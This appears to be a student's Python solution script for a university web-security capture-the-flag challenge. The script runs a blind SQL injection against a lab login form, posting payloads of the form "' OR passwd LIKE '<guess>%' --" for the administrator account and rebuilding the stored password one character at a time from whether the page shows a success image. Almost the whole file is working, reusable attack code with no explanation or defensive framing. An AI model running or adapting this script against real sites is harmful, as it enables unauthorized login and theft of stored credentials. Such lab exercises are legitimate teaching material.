import requests
import unicodedata
url = 'http://vad700.cse.lsu.edu/assign4/chall3/submit'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'vad700.cse.lsu.edu',
    'Origin': 'http://vad700.cse.lsu.edu',
    'Referer': 'http://vad700.cse.lsu.edu/assign4/chall3/login.html',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
}

def is_successful(response_text):
    return "yes.jpg" in response_text

def perform_sql_injection(url, payload):
    data = {'uname': 'administrator', 'psw': payload}
    print(data)
    response = requests.post(url, data=data, headers=headers)
    print(f"{response.text}")
    return is_successful(response.text)

def extract_password(url):
    password = 'lsu_websec_ctf{'
    characters = ' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}[]<>.,;:?!@#$%^&*()-=_+|`~\\/\'\"'
    for i in range(128, 1000):
        try:
            char = chr(i)
            unicodedata.name(char)
            characters += char
        except ValueError:
            pass

    found = True
    
    while found:
        found = False
        for char in characters:
            test_char = char
            if char in ['%',"'",'"','\\','_']:
                test_char = '\\' + char
            print(f"testing char:",{test_char})
            payload = f"' OR passwd LIKE '{password + test_char}%' ESCAPE '\\' --"
            if perform_sql_injection(url, payload):
                password += char
                found = True
                break
        
            

    return password

print("Starting the extraction process...")
password = extract_password(url)
print(f"The extracted password is: {password}")

